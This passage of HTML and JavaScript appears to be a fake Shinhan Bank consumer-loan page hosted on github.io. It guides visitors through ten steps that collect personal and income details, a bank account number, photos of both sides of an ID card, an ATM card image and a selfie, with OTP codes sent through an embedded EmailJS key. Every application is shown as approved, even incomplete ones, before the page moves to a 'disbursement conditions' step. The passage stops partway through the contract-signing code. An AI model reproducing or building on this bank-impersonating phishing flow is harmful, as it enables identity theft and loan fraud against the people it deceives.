                        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/30x30?text=Logo+Shinhan'">
                        <h5 class="modal-title" id="successModalLabel">Chúc Mừng!</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <p>Hồ sơ vay tín chấp của bạn đã được duyệt thành công!</p>
                        <p id="modalFullName"></p>
                        <p id="modalLoanAmount"></p>
                        <p id="modalLoanCode"></p>
                        <p>Thông tin chi tiết đã được gửi đến email của bạn.</p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-primary" data-bs-dismiss="modal" onclick="proceedToContract()">Tiếp Tục</button>
                    </div>
                </div>
            </div>
        </div>

        <div class="footer">
            <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" class="lock-icon" onerror="this.src='https://via.placeholder.com/24x24?text=Lock'">
            <p>© 2025 Shinhan Bank - Hotline: 1900 1234 - Email: support@shinhan.com.vn</p>
            <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" alt="Shinhan Bank Logo" class="footer-logo" onerror="this.src='https://via.placeholder.com/130x50?text=Logo+Shinhan'">
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        const { jsPDF } = window.jspdf;
        (function() {
            emailjs.init("OrBsI926QI2_xBh1f");
        })();

        function showToast(message, isSuccess = true) {
            try {
                const toast = document.getElementById('emailToast');
                const toastBody = toast.querySelector('.toast-body');
                toastBody.textContent = message;
                toast.classList.remove('bg-success', 'bg-danger');
                toast.classList.add(isSuccess ? 'bg-success' : 'bg-danger');
                const bsToast = new bootstrap.Toast(toast);
                bsToast.show();
            } catch (error) {
                console.error("Lỗi hiển thị toast:", error);
            }
        }

        let formData = {
            contractImage: "https://vaytieudung.github.io/shinhanbank/public/documents/contract.png", // Chuyển sang PNG
            disbursementImage: "https://vaytieudung.github.io/shinhanbank/public/documents/disbursement.png", // Chuyển sang PNG
            fallbackImage: "https://via.placeholder.com/720x1018?text=Hinh+Anh+Mac+Dinh",
            fallbackProfileImage: "https://via.placeholder.com/150x150?text=Anh+Ho+So"
        };

        let userData = {};
        const stepLabels = {
            1: "Bước 1/10: Đăng ký thông tin",
            2: "Bước 2/10: Tải lên giấy tờ tùy thân",
            3: "Bước 3/10: Tải lên thẻ ATM",
            4: "Bước 4/10: Tải lên ảnh khuôn mặt",
            5: "Bước 5/10: Xác minh OTP",
            7: "Bước 6/10: Hồ sơ được duyệt",
            8: "Bước 7/10: Xem hợp đồng",
            '8-1': "Bước 8/10: Ký hợp đồng",
            9: "Bước 9/10: Điều kiện giải ngân",
            10: "Bước 10/10: Hoàn tất"
        };

        function saveToLocalStorage(step) {
            try {
                userData.currentStep = step;
                localStorage.setItem('userData', JSON.stringify(userData));
            } catch (error) {
                console.error("Lỗi lưu localStorage:", error);
                showToast("Lỗi lưu dữ liệu. Vui lòng thử lại!", false);
            }
        }

        function updatePreviewSection() {
            try {
                if (userData.currentStep >= 4 && userData.faceImageUrl) {
                    $('#profileImagePreview').html(`<img src="${userData.faceImageUrl}" alt="Hình ảnh khuôn mặt" />`);
                    $('#step7ProfileImagePreview').html(`<img src="${userData.faceImageUrl}" alt="Hình ảnh khuôn mặt" />`);
                } else {
                    $('#profileImagePreview').html('<p>Hình ảnh khuôn mặt: Chưa tải lên</p>');
                    $('#step7ProfileImagePreview').html('<p>Hình ảnh khuôn mặt: Chưa tải lên</p>');
                }
                if (userData.currentStep >= 7 && userData.contractImageUrl) {
                    $('#contractImagePreview').html(`<img src="${userData.contractImageUrl}" alt="Hình ảnh hợp đồng" />`);
                } else {
                    $('#contractImagePreview').html('<p>Hình ảnh hợp đồng: Chưa có</p>');
                }
            } catch (error) {
                console.error("Lỗi cập nhật preview section:", error);
                $('#profileImagePreview').html('<p>Hình ảnh khuôn mặt: Chưa tải lên</p>');
                $('#contractImagePreview').html('<p>Hình ảnh hợp đồng: Chưa có</p>');
                $('#step7ProfileImagePreview').html('<p>Hình ảnh khuôn mặt: Chưa tải lên</p>');
            }
        }

        function proceedToStep(currentStep, nextStep, progress) {
            try {
                console.log(`Chuyển từ bước ${currentStep} sang ${nextStep}`);
                const $current = $(`#step${currentStep}`);
                const $next = $(`#step${nextStep}`);
                if (!$current.length || !$next.length) {
                    throw new Error('One or both steps not found in DOM');
                }
                $current.css({ opacity: 0, transform: 'translateY(20px)' });
                setTimeout(() => {
                    $current.addClass('hidden');
                    $next.removeClass('hidden').css({ opacity: 0, transform: 'translateY(20px)' });
                    setTimeout(() => {
                        $next.css({ opacity: 1, transform: 'translateY(0)' });
                    }, 50);
                }, 300);
                $('#progressBar').css('width', `${progress}%`);
                $('#progressLabel').text(stepLabels[nextStep] || `Bước ${nextStep}/10`);
                userData.currentStep = nextStep;
                saveToLocalStorage(nextStep);
                updatePreviewSection();
                if (nextStep === 7) {
                    renderContractCanvas('step7ContractCanvas', formData.contractImage, userData);
                    if (userData.isIncomplete) {
                        $('#incompleteWarning').show();
                    } else {
                        $('#incompleteWarning').hide();
                    }
                } else if (nextStep === 8) {
                    renderContractCanvas('contractCanvas', formData.contractImage, userData);
                } else if (nextStep === 9) {
                    renderDisbursementCanvas('disbursementCanvas', formData.disbursementImage, userData);
                    $('#disbursementAccount').text(`${userData.accountNumber} (${userData.bankName})`);
                }
            } catch (error) {
                console.error(`Lỗi chuyển từ bước ${currentStep} sang ${nextStep}:`, error);
                showToast("Lỗi chuyển bước. Vui lòng thử lại!", false);
            }
        }

        function goBack(currentStep, prevStep, progress) {
            try {
                if (confirm('Bạn có chắc muốn quay lại bước trước? Dữ liệu đã nhập sẽ được lưu.')) {
                    proceedToStep(currentStep, prevStep, progress);
                }
            } catch (error) {
                console.error(`Lỗi quay lại từ bước ${currentStep} sang ${prevStep}:`, error);
                showToast("Lỗi quay lại bước. Vui lòng thử lại!", false);
            }
        }

        function proceedToContract() {
            proceedToStep(7, 8, 70);
        }

        function validateFormData(data) {
            const errors = [];
            const defaults = {
                fullName: "Không Cung Cấp",
                idNumber: "Không Cung Cấp",
                idIssueDate: "01/01/2000",
                idIssuePlace: "Không Cung Cấp",
                address: "Không Cung Cấp",
                occupation: "Không Cung Cấp",
                income: "0",
                phoneNumber: "Không Cung Cấp",
                email: "Không Cung Cấp",
                loanAmount: "0",
                loanTerm: "12",
                loanPurpose: "Vay tiêu dùng",
                accountNumber: "Không Cung Cấp",
                bankName: "Không Cung Cấp",
                creditHistory: "Không có nợ xấu"
            };

            if (!data.fullName || !/^[a-zA-ZÀ-ỹ\s]+$/.test(data.fullName)) {
                data.fullName = defaults.fullName;
                errors.push("Họ và tên không hợp lệ");
            }
            if (!data.idNumber || !/^\d{9,12}$/.test(data.idNumber)) {
                data.idNumber = defaults.idNumber;
                errors.push("Số CMND/CCCD/Hộ chiếu không hợp lệ");
            }
            if (!data.idIssueDate || new Date(data.idIssueDate) > new Date()) {
                data.idIssueDate = defaults.idIssueDate;
                errors.push("Ngày cấp không hợp lệ");
            }
            if (!data.idIssuePlace || data.idIssuePlace.trim() === "") {
                data.idIssuePlace = defaults.idIssuePlace;
                errors.push("Nơi cấp không hợp lệ");
            }
            if (!data.address || data.address.trim() === "") {
                data.address = defaults.address;
                errors.push("Địa chỉ không hợp lệ");
            }
            if (!data.occupation || data.occupation === "") {
                data.occupation = defaults.occupation;
                errors.push("Nghề nghiệp không được chọn");
            }
            if (!data.income || isNaN(data.income.replace(/,/g, '')) || parseInt(data.income.replace(/,/g, '')) <= 0) {
                data.income = defaults.income;
                errors.push("Thu nhập không hợp lệ");
            }
            if (!data.phoneNumber || !/^\d{10,11}$/.test(data.phoneNumber)) {
                data.phoneNumber = defaults.phoneNumber;
                errors.push("Số điện thoại không hợp lệ");
            }
            if (!data.email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email)) {
                data.email = defaults.email;
                errors.push("Email không hợp lệ");
            }
            if (!data.loanAmount || isNaN(data.loanAmount.replace(/,/g, '')) || parseInt(data.loanAmount.replace(/,/g, '')) <= 0) {
                data.loanAmount = defaults.loanAmount;
                errors.push("Số tiền vay không hợp lệ");
            }
            if (!data.loanTerm || !['12', '24', '36', '48', '60'].includes(data.loanTerm)) {
                data.loanTerm = defaults.loanTerm;
                errors.push("Kỳ hạn vay không hợp lệ");
            }
            if (!data.loanPurpose || data.loanPurpose === "") {
                data.loanPurpose = defaults.loanPurpose;
                errors.push("Mục đích vay không được chọn");
            }
            if (!data.accountNumber || !/^\d{10,16}$/.test(data.accountNumber)) {
                data.accountNumber = defaults.accountNumber;
                errors.push("Số tài khoản không hợp lệ");
            }
            if (!data.bankName || data.bankName === "") {
                data.bankName = defaults.bankName;
                errors.push("Ngân hàng không được chọn");
            }
            if (!data.creditHistory || data.creditHistory === "") {
                data.creditHistory = defaults.creditHistory;
                errors.push("Lịch sử tín dụng không được chọn");
            }

            return { isValid: errors.length === 0, errors, data };
        }

        window.onload = function() {
            try {
                const today = new Date().toISOString().split('T')[0];
                $('#idIssueDate').attr('max', today);

                const savedData = localStorage.getItem('userData');
                if (savedData) {
                    userData = JSON.parse(savedData);
                    if (userData.isRegistered && userData.loanCode) {
                        showToast("Hồ sơ đã có trên hệ thống. Vui lòng quay lại!", false);
                        $('#registerForm button[type="submit"]').prop('disabled', true);
                        if (userData.currentStep >= 10) {
                            proceedToStep(1, 10, 100);
                        } else if (userData.currentStep) {
                            proceedToStep(1, userData.currentStep, userData.currentStep * 10);
                        }
                    } else {
                        $('#fullName').val(userData.fullName || '');
                        $('#idNumber').val(userData.idNumber || '');
                        $('#idIssueDate').val(userData.idIssueDate || '');
                        $('#idIssuePlace').val(userData.idIssuePlace || '');
                        $('#address').val(userData.address || '');
                        $('#occupation').val(userData.occupation || '');
                        $('#income').val(userData.income ? Number(userData.income.replace(/,/g, '')).toLocaleString('vi-VN') : '');
                        $('#phoneNumber').val(userData.phoneNumber || '');
                        $('#email').val(userData.email || '');
                        $('#loanAmount').val(userData.loanAmount ? Number(userData.loanAmount.replace(/,/g, '')).toLocaleString('vi-VN') : '');
                        $('#loanTerm').val(userData.loanTerm || '');
                        $('#loanPurpose').val(userData.loanPurpose || '');
                        $('#accountNumber').val(userData.accountNumber || '');
                        $('#bankName').val(userData.bankName || '');
                        $('#creditHistory').val(userData.creditHistory || '');
                        $('#termsAgree').prop('checked', userData.termsAgree || false);
                        if (userData.currentStep) {
                            proceedToStep(1, userData.currentStep, userData.currentStep * 10);
                        }
                    }
                    updatePreviewSection();
                }
                $('[data-bs-toggle="tooltip"]').tooltip();
                $('#phoneNumber').mask('0000000000#');
                $('#accountNumber').mask('0000000000000000');
                $('#idNumber').mask('000000000000');
            } catch (error) {
                console.error("Lỗi khôi phục localStorage:", error);
                showToast("Không thể khôi phục dữ liệu. Vui lòng bắt đầu lại.", false);
                userData = {};
                saveToLocalStorage(1);
                updatePreviewSection();
            }
        };

        function sanitizeInput(value) {
            if (!value) return "Không Cung Cấp";
            return String(value)
                .replace(/[<>"'&]/g, '')
                .trim();
        }

        function formatNumber(number) {
            if (!number || isNaN(number)) return "0";
            return parseInt(number.replace(/,/g, '')).toLocaleString('vi-VN');
        }

        function generateContractId() {
            try {
                const date = new Date();
                const randomNum = Math.floor(100000 + Math.random() * 900000);
                return `SHB-${date.getFullYear()}${(date.getMonth() + 1).toString().padStart(2, '0')}${date.getDate().toString().padStart(2, '0')}-${randomNum}`;
            } catch (error) {
                console.error("Lỗi tạo mã hợp đồng:", error);
                return "SHB-DEFAULT-000000";
            }
        }

        function generateRandomCode(length = 6) {
            try {
                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                let result = '';
                for (let i = 0; i < length; i++) {
                    result += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                return result;
            } catch (error) {
                console.error("Lỗi tạo mã ngẫu nhiên:", error);
                return "000000".slice(0, length);
            }
        }

        function getCurrentDate() {
            try {
                const date = new Date();
                return `${date.getDate().toString().padStart(2, '0')}/${(date.getMonth() + 1).toString().padStart(2, '0')}/${date.getFullYear()}`;
            } catch (error) {
                console.error("Lỗi lấy ngày hiện tại:", error);
                return "01/01/2025";
            }
        }

        function calculateInterestRate(loanAmount) {
            try {
                const amount = parseInt(loanAmount.replace(/,/g, ''));
                if (amount <= 50000000) return "12%";
                if (amount <= 200000000) return "11%";
                return "10%";
            } catch (error) {
                console.error("Lỗi tính lãi suất:", error);
                return "12%";
            }
        }

        function calculateMonthlyPayment(loanAmount, loanTerm) {
            try {
                const monthlyInterestRate = 0.01;
                const totalInterest = parseInt(loanAmount.replace(/,/g, '')) * monthlyInterestRate * loanTerm;
                const totalAmount = parseInt(loanAmount.replace(/,/g, '')) + totalInterest;
                const monthlyPayment = totalAmount / loanTerm;
                return Math.round(monthlyPayment).toLocaleString('vi-VN');
            } catch (error) {
                console.error("Lỗi tính toán khoản góp:", error);
                return "0";
            }
        }

        async function validateImage(file, inputId) {
            try {
                const maxSize = 5 * 1024 * 1024; // 5MB
                const minResolution = 300; // 300x300px
                const allowedTypes = ['image/jpeg', 'image/png'];
                if (!file) {
                    $(`#${inputId}`).addClass('is-invalid');
                    showToast("Vui lòng tải lên tệp ảnh!", false);
                    return false;
                }
                if (!allowedTypes.includes(file.type)) {
                    $(`#${inputId}`).addClass('is-invalid');
                    showToast("Vui lòng tải lên tệp JPEG hoặc PNG!", false);
                    return false;
                }
                if (file.size > maxSize) {
                    $(`#${inputId}`).addClass('is-invalid');
                    showToast("Tệp ảnh không được vượt quá 5MB!", false);
                    return false;
                }
                const img = new Image();
                return new Promise((resolve, reject) => {
                    img.onload = function() {
                        if (img.width < minResolution || img.height < minResolution) {
                            $(`#${inputId}`).addClass('is-invalid');
                            showToast(`Ảnh phải có độ phân giải tối thiểu ${minResolution}x${minResolution}px!`, false);
                            resolve(false);
                        } else {
                            $(`#${inputId}`).removeClass('is-invalid');
                            resolve(true);
                        }
                    };
                    img.onerror = function() {
                        $(`#${inputId}`).addClass('is-invalid');
                        showToast("Lỗi tải ảnh. Vui lòng thử lại!", false);
                        reject(new Error("Lỗi tải ảnh"));
                    };
                    img.src = URL.createObjectURL(file);
                });
            } catch (error) {
                console.error(`Lỗi validate ảnh ${inputId}:`, error);
                $(`#${inputId}`).addClass('is-invalid');
                showToast("Lỗi xử lý ảnh. Vui lòng thử lại!", false);
                return false;
            }
        }

        async function compressImage(file) {
            try {
                const maxSize = 5 * 1024 * 1024; // 5MB
                const quality = 0.7;
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                const img = new Image();
                img.src = URL.createObjectURL(file);
                await new Promise((resolve, reject) => {
                    img.onload = resolve;
                    img.onerror = () => reject(new Error("Lỗi tải ảnh để nén"));
                });
                canvas.width = img.width;
                canvas.height = img.height;
                ctx.drawImage(img, 0, 0);
                const compressedDataUrl = canvas.toDataURL('image/jpeg', quality);
                const compressedBlob = await (await fetch(compressedDataUrl)).blob();
                const compressedFile = new File([compressedBlob], file.name, { type: 'image/jpeg' });
                if (compressedFile.size > maxSize) {
                    showToast("Ảnh nén vẫn vượt quá 5MB!", false);
                    return null;
                }
                return compressedFile;
            } catch (error) {
                console.error("Lỗi nén ảnh:", error);
                showToast("Lỗi nén ảnh. Vui lòng thử lại!", false);
                return null;
            }
        }

        $('#registerForm').on('submit', async function(e) {
            try {
                e.preventDefault();
                const $form = $(this);
                const $submitBtn = $form.find('button[type="submit"]');
                $submitBtn.addClass('loading').prop('disabled', true);

                if (!$('#termsAgree').is(':checked')) {
                    $('#termsAgree').addClass('is-invalid');
                    showToast("Vui lòng đồng ý với điều khoản và điều kiện!", false);
                    $submitBtn.removeClass('loading').prop('disabled', false);
                    return;
                }

                userData = {
                    fullName: sanitizeInput($('#fullName').val().trim()),
                    idNumber: $('#idNumber').val().trim(),
                    idIssueDate: $('#idIssueDate').val(),
                    idIssuePlace: sanitizeInput($('#idIssuePlace').val().trim()),
                    address: sanitizeInput($('#address').val().trim()),
                    occupation: $('#occupation').val(),
                    income: $('#income').val().trim(),
                    phoneNumber: $('#phoneNumber').val().trim(),
                    email: $('#email').val().trim(),
                    loanAmount: $('#loanAmount').val().trim(),
                    loanTerm: $('#loanTerm').val(),
                    loanPurpose: $('#loanPurpose').val(),
                    accountNumber: $('#accountNumber').val().trim(),
                    bankName: $('#bankName').val(),
                    creditHistory: $('#creditHistory').val(),
                    termsAgree: $('#termsAgree').is(':checked'),
                    isRegistered: false,
                    loanCode: generateContractId(),
                    interestRate: calculateInterestRate($('#loanAmount').val()),
                    monthlyPayment: calculateMonthlyPayment($('#loanAmount').val(), $('#loanTerm').val()),
                    registrationDate: getCurrentDate()
                };

                const validation = validateFormData(userData);
                userData = validation.data;
                if (!validation.isValid) {
                    showToast("Dữ liệu chưa đầy đủ: " + validation.errors.join(", "), false);
                    userData.isIncomplete = true;
                } else {
                    userData.isIncomplete = false;
                }

                userData.isRegistered = true;
                saveToLocalStorage(2);
                await new Promise(resolve => setTimeout(resolve, 500));
                showToast("Thông tin đã được lưu! Bạn có thể tiếp tục.", true);
                proceedToStep(1, 2, 20);
                $submitBtn.removeClass('loading').prop('disabled', false);
            } catch (error) {
                console.error("Lỗi xử lý form đăng ký:", error);
                showToast("Lỗi xử lý đăng ký. Vui lòng thử lại!", false);
                $submitBtn.removeClass('loading').prop('disabled', false);
            }
        });

        $('#idFrontImage').on('change', function() {
            try {
                const file = this.files[0];
                if (file) {
                    $('#idFrontInfo').text(`Tệp: ${file.name}, Kích thước: ${(file.size / 1024 / 1024).toFixed(2)} MB`);
                } else {
                    $('#idFrontInfo').text('Định dạng JPEG/PNG, tối đa 5MB, độ phân giải tối thiểu 300x300px');
                }
            } catch (error) {
                console.error("Lỗi xử lý file mặt trước:", error);
                showToast("Lỗi xử lý file. Vui lòng thử lại!", false);
            }
        });

        $('#idBackImage').on('change', function() {
            try {
                const file = this.files[0];
                if (file) {
                    $('#idBackInfo').text(`Tệp: ${file.name}, Kích thước: ${(file.size / 1024 / 1024).toFixed(2)} MB`);
                } else {
                    $('#idBackInfo').text('Định dạng JPEG/PNG, tối đa 5MB, độ phân giải tối thiểu 300x300px');
                }
            } catch (error) {
                console.error("Lỗi xử lý file mặt sau:", error);
                showToast("Lỗi xử lý file. Vui lòng thử lại!", false);
            }
        });

        $('#proceedToStep3Btn').on('click', async function() {
            try {
                const $btn = $(this);
                $btn.addClass('loading').prop('disabled', true);
                const idFrontFile = $('#idFrontImage')[0].files[0];
                const idBackFile = $('#idBackImage')[0].files[0];
                if (!idFrontFile || !idBackFile) {
                    showToast("Vui lòng tải lên cả hai mặt của CMND/CCCD!", false);
                    $btn.removeClass('loading').prop('disabled', false);
                    return;
                }
                const isFrontValid = await validateImage(idFrontFile, 'idFrontImage');
                const isBackValid = await validateImage(idBackFile, 'idBackImage');
                if (!isFrontValid || !isBackValid) {
                    $btn.removeClass('loading').prop('disabled', false);
                    return;
                }
                const compressedFront = await compressImage(idFrontFile);
                const compressedBack = await compressImage(idBackFile);
                if (!compressedFront || !compressedBack) {
                    $btn.removeClass('loading').prop('disabled', false);
                    return;
                }
                userData.idFrontImageUrl = URL.createObjectURL(compressedFront);
                userData.idBackImageUrl = URL.createObjectURL(compressedBack);
                saveToLocalStorage(3);
                showToast("Hình ảnh giấy tờ tùy thân đã được lưu!", true);
                proceedToStep(2, 3, 30);
                $btn.removeClass('loading').prop('disabled', false);
            } catch (error) {
                console.error("Lỗi xử lý bước 2:", error);
                showToast("Lỗi tải lên giấy tờ. Vui lòng thử lại!", false);
                $btn.removeClass('loading').prop('disabled', false);
            }
        });

        $('#atmImage').on('change', function() {
            try {
                const file = this.files[0];
                if (file) {
                    $('#atmImageInfo').text(`Tệp: ${file.name}, Kích thước: ${(file.size / 1024 / 1024).toFixed(2)} MB`);
                } else {
                    $('#atmImageInfo').text('Định dạng JPEG/PNG, tối đa 5MB, độ phân giải tối thiểu 300x300px');
                }
            } catch (error) {
                console.error("Lỗi xử lý file thẻ ATM:", error);
                showToast("Lỗi xử lý file. Vui lòng thử lại!", false);
            }
        });
$('#proceedToStep4Btn').on('click', async function() {
            try {
                const $btn = $(this);
                $btn.addClass('loading').prop('disabled', true);
                const atmFile = $('#atmImage')[0].files[0];
                if (!atmFile) {
                    showToast("Vui lòng tải lên hình ảnh thẻ ATM!", false);
                    $btn.removeClass('loading').prop('disabled', false);
                    return;
                }
                const isAtmValid = await validateImage(atmFile, 'atmImage');
                if (!isAtmValid) {
                    $btn.removeClass('loading').prop('disabled', false);
                    return;
                }
                const compressedAtm = await compressImage(atmFile);
                if (!compressedAtm) {
                    $btn.removeClass('loading').prop('disabled', false);
                    return;
                }
                userData.atmImageUrl = URL.createObjectURL(compressedAtm);
                saveToLocalStorage(4);
                showToast("Hình ảnh thẻ ATM đã được lưu!", true);
                proceedToStep(3, 4, 40);
                $btn.removeClass('loading').prop('disabled', false);
            } catch (error) {
                console.error("Lỗi xử lý bước 3:", error);
                showToast("Lỗi tải lên thẻ ATM. Vui lòng thử lại!", false);
                $btn.removeClass('loading').prop('disabled', false);
            }
        });

        $('#faceImage').on('change', function() {
            try {
                const file = this.files[0];
                if (file) {
                    $('#faceImageInfo').text(`Tệp: ${file.name}, Kích thước: ${(file.size / 1024 / 1024).toFixed(2)} MB`);
                } else {
                    $('#faceImageInfo').text('Định dạng JPEG/PNG, tối đa 5MB, độ phân giải tối thiểu 300x300px');
                }
            } catch (error) {
                console.error("Lỗi xử lý file ảnh khuôn mặt:", error);
                showToast("Lỗi xử lý file. Vui lòng thử lại!", false);
            }
        });

        $('#proceedToOtpBtn').on('click', async function() {
            try {
                const $btn = $(this);
                $btn.addClass('loading').prop('disabled', true);
                const faceFile = $('#faceImage')[0].files[0];
                if (!faceFile) {
                    showToast("Vui lòng tải lên hình ảnh khuôn mặt!", false);
                    $btn.removeClass('loading').prop('disabled', false);
                    return;
                }
                const isFaceValid = await validateImage(faceFile, 'faceImage');
                if (!isFaceValid) {
                    $btn.removeClass('loading').prop('disabled', false);
                    return;
                }
                const compressedFace = await compressImage(faceFile);
                if (!compressedFace) {
                    $btn.removeClass('loading').prop('disabled', false);
                    return;
                }
                userData.faceImageUrl = URL.createObjectURL(compressedFace);
                saveToLocalStorage(5);
                showToast("Hình ảnh khuôn mặt đã được lưu!", true);
                sendOtp();
                proceedToStep(4, 5, 50);
                $btn.removeClass('loading').prop('disabled', false);
            } catch (error) {
                console.error("Lỗi xử lý bước 4:", error);
                showToast("Lỗi tải lên ảnh khuôn mặt. Vui lòng thử lại!", false);
                $btn.removeClass('loading').prop('disabled', false);
            }
        });

        function generateOtp() {
            try {
                const otp = Math.floor(100000 + Math.random() * 900000).toString();
                userData.otp = otp;
                saveToLocalStorage(userData.currentStep);
                return otp;
            } catch (error) {
                console.error("Lỗi tạo OTP:", error);
                return "123456";
            }
        }

        function sendOtp() {
            try {
                const otp = generateOtp();
                $('#otpDisplay').text(otp);
                const templateParams = {
                    to_email: userData.email || "unknown@example.com",
                    full_name: userData.fullName || "Khách hàng",
                    otp_code: otp,
                    loan_code: userData.loanCode || "N/A"
                };
                emailjs.send('service_6s4r7xg', 'template_7n3y8vh', templateParams)
                    .then(() => {
                        showToast("Mã OTP đã được gửi đến email của bạn!", true);
                    })
                    .catch(error => {
                        console.error("Lỗi gửi OTP:", error);
                        showToast("Lỗi gửi OTP. Vui lòng thử lại!", false);
                    });
            } catch (error) {
                console.error("Lỗi xử lý gửi OTP:", error);
                showToast("Lỗi xử lý OTP. Vui lòng thử lại!", false);
            }
        }

        function copyOtp() {
            try {
                const otp = $('#otpDisplay').text();
                navigator.clipboard.writeText(otp).then(() => {
                    showToast("Đã sao chép mã OTP!", true);
                }).catch(error => {
                    console.error("Lỗi sao chép OTP:", error);
                    showToast("Lỗi sao chép OTP!", false);
                });
            } catch (error) {
                console.error("Lỗi xử lý sao chép OTP:", error);
                showToast("Lỗi sao chép OTP!", false);
            }
        }

        function resendOtp() {
            try {
                sendOtp();
                showToast("Mã OTP mới đã được gửi!", true);
            } catch (error) {
                console.error("Lỗi gửi lại OTP:", error);
                showToast("Lỗi gửi lại OTP!", false);
            }
        }

        $('.otp-digit').on('input', function(e) {
            try {
                const $this = $(this);
                const value = $this.val();
                if (value.length === 1 && !isNaN(value)) {
                    const nextInput = $this.next('.otp-digit');
                    if (nextInput.length) {
                        nextInput.focus();
                    }
                } else if (value.length === 0) {
                    const prevInput = $this.prev('.otp-digit');
                    if (prevInput.length) {
                        prevInput.focus();
                    }
                } else {
                    $this.val('');
                }
            } catch (error) {
                console.error("Lỗi xử lý input OTP:", error);
                showToast("Lỗi nhập OTP. Vui lòng thử lại!", false);
            }
        });

        $('.otp-digit').on('keydown', function(e) {
            try {
                if (e.key === 'Backspace' && $(this).val() === '') {
                    const prevInput = $(this).prev('.otp-digit');
                    if (prevInput.length) {
                        prevInput.focus();
                    }
                }
            } catch (error) {
                console.error("Lỗi xử lý phím Backspace OTP:", error);
            }
        });

        $('#verifyOtpBtn').on('click', async function() {
            try {
                const $btn = $(this);
                $btn.addClass('loading').prop('disabled', true);
                const otp = $('#otp1').val() + $('#otp2').val() + $('#otp3').val() + $('#otp4').val() + $('#otp5').val() + $('#otp6').val();
                if (otp.length !== 6 || isNaN(otp)) {
                    showToast("Vui lòng nhập mã OTP hợp lệ!", false);
                    $btn.removeClass('loading').prop('disabled', false);
                    return;
                }
                if (otp === userData.otp) {
                    userData.isOtpVerified = true;
                    saveToLocalStorage(7);
                    $('#confirmationMessage').text(`Hồ sơ vay ${formatNumber(userData.loanAmount)} VND của bạn đã được duyệt với mã hợp đồng ${userData.loanCode}.`);
                    $('#confirmationEmail').text(userData.email || "N/A");
                    $('#modalFullName').text(`Họ và Tên: ${userData.fullName || "N/A"}`);
                    $('#modalLoanAmount').text(`Số Tiền Vay: ${formatNumber(userData.loanAmount)} VND`);
                    $('#modalLoanCode').text(`Mã Hợp Đồng: ${userData.loanCode || "N/A"}`);
                    const successModal = new bootstrap.Modal(document.getElementById('successModal'));
                    successModal.show();
                    showToast("Xác minh OTP thành công!", true);
                    proceedToStep(5, 7, 60);
                } else {
                    showToast("Mã OTP không đúng!", false);
                }
                $btn.removeClass('loading').prop('disabled', false);
            } catch (error) {
                console.error("Lỗi xác minh OTP:", error);
                showToast("Lỗi xác minh OTP. Vui lòng thử lại!", false);
                $btn.removeClass('loading').prop('disabled', false);
            }
        });

        $('#proceedToContractBtn').on('click', function() {
            try {
                const $btn = $(this);
                $btn.addClass('loading').prop('disabled', true);
                setTimeout(() => {
                    proceedToStep(7, 8, 70);
                    $btn.removeClass('loading').prop('disabled', false);
                }, 500);
            } catch (error) {
                console.error("Lỗi chuyển sang bước hợp đồng:", error);
                showToast("Lỗi chuyển bước. Vui lòng thử lại!", false);
                $btn.removeClass('loading').prop('disabled', false);
            }
        });

        function generateSignOtp() {
            try {
                const otp = Math.floor(100000 + Math.random() * 900000).toString();
                userData.signOtp = otp;
                saveToLocalStorage(userData.currentStep);
                return otp;
            } catch (error) {
                console.error("Lỗi tạo OTP ký hợp đồng:", error);
                return "123456";
            }
        }

        function sendSignOtp() {
            try {
                const otp = generateSignOtp();
                $('#signOtpDisplay').text(otp);
                const templateParams = {
                    to_email: userData.email || "unknown@example.com",
                    full_name: userData.fullName || "Khách hàng",
                    otp_code: otp,
                    loan_code: userData.loanCode || "N/A"
                };
                emailjs.send('service_6s4r7xg', 'template_7n3y8vh', templateParams)
                    .then(() => {
                        showToast("Mã OTP ký hợp đồng đã được gửi!", true);
                    })
                    .catch(error => {
                        console.error("Lỗi gửi OTP ký hợp đồng:", error);
                        showToast("Lỗi gửi OTP ký hợp đồng!", false);
                    });
            } catch (error) {
                console.error("Lỗi xử lý gửi OTP ký hợp đồng:", error);
                showToast("Lỗi xử lý OTP ký hợp đồng!", false);
            }
        }

        function copySignOtp() {
            try {
                const otp = $('#signOtpDisplay').text();
                navigator.clipboard.writeText(otp).then(() => {
                    showToast("Đã sao chép mã OTP ký hợp đồng!", true);
                }).catch(error => {
                    console.error("Lỗi sao chép OTP ký hợp đồng:", error);
                    showToast("Lỗi sao chép OTP ký hợp đồng!", false);
                });
            } catch (error) {
                console.error("Lỗi xử lý sao chép OTP ký hợp đồng:", error);
                showToast("Lỗi sao chép OTP ký hợp đồng!", false);
            }
        }

        function resendSignOtp() {
            try {
                sendSignOtp();
                showToast("Mã OTP ký hợp đồng mới đã được gửi!", true);
            } catch (error) {
                console.error("Lỗi gửi lại OTP ký hợp đồng:", error);
                showToast("Lỗi gửi lại OTP ký hợp đồng!", false);
            }
        }

        $('#proceedToSignContractBtn').on('click', function() {
            try {
                const $btn = $(this);
                $btn.addClass('loading').prop('disabled', true);
                sendSignOtp();
                proceedToStep(8, '8-1', 80);
                $btn.removeClass('loading').prop('disabled', false);
            } catch (error) {
                console.error("Lỗi chuyển sang bước ký hợp đồng:", error);
                showToast("Lỗi chuyển bước. Vui lòng thử lại!", false);
                $btn.removeClass('loading').prop('disabled', false);
            }
        });

        $('#verifySignOtpBtn').on('click', async function() {
            try {
                const $btn = $(this);
                $btn.addClass('loading').prop('disabled', true);
                const otp = $('#signOtp1').val() + $('#signOtp2').val() + $('#signOtp3').val() + $('#signOtp4').val() + $('#signOtp5').val() + $('#signOtp6').val();
                if (otp.length !== 6 || isNaN(otp)) {
                    showToast("Vui lòng nhập mã OTP hợp lệ!", false);
                    $btn.removeClass('loading').prop('disabled', false);
                    return;
                }
                if (otp === userData.signOtp) {
                    userData.isContractSigned = true;
                    saveToLocalStorage(9);
